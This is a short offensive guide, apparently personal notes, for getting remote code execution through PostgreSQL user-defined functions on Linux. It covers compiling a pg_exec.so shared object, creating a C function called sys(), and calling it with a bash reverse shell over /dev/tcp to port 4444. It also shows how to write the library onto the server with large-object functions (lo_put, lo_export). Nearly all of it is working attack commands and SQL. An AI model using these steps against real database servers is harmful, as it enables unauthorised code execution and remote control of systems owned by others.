Postgresql UDF RCE - Linux guide

0. pg apt setup
$ curl https://www.postgresql.org/media/keys/ACCC4CF8.asc | sudo apt-key add -
$ sudo sh -c 'echo "deb http://apt.postgresql.org/pub/repos/apt buster-pgdg main" > /etc/apt/sources.list.d/pgdg.list'
$ sudo apt-get update

1. get `version()` in pgsql

2. download appropriate devkit
$ apt install postgresql postgresql-server-dev-9.6

3. enter psql shell
$ su postgres
$ psql

4. build shared-object
$ gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_exec.so pg_exec.c
or
$ gcc -I/usr/include/postgresql/10/server -shared -fPIC -o pg_exec.so pg_exec.c

5. create sql function
sql> CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec.so', 'pg_exec' LANGUAGE C STRICT;
sql> SELECT sys('bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"');

6. use largeobject to upload shared-object
 I.
sql> select lo_unlink(6666);
sql> select lo_create(6666);
 II.
sql> select lo_creat(-1);   # get a fresh largeobject

sql> select lo_put(6666, 0, '\x41414141'); # put 4 bytes at offset 0
...

sql> select lo_export(6666, '/tmp/pg_exec.so');
sql> select lo_unlink(6666);  # cleanup

